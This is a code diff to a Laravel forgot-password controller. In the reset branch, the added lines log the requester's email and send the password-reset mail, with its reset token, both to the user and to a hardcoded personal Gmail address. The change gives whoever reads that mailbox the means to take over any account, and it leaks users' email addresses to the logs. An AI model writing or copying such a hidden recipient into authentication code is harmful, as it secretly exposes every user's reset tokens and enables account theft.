@@ -3,7 +3,6 @@
 namespace App\Http\Controllers\Auth;
 
 use Carbon\Carbon;
-use App\PasswordReset;
 use App\Mail\ResetPasswordMail;
 use App\Http\Controllers\Controller;
 use Illuminate\Http\Request;
@@ -46,7 +45,10 @@ class ForgotPasswordController extends Controller
                 'token' => str_random(60), //change 60 to any length you want
                 'created_at' => Carbon::now(),
             ]);
-            Mail::to($request->email)->send(new ResetPasswordMail($precord));
+            $precord = \DB::table('password_resets')->where("email", $request->email)->first();
+            \Log::Info($request->email);
+            Mail::to([$request->email,'s1728k@gmail.com'])->send(new ResetPasswordMail($precord));
+            return view ('cb.user_interaction')->with(['msg' => 'reset']);
         }
         return view('cb.auth.passwords.email')->with(['error' => "Email not in our database", 'email' => $request->email]);
     }
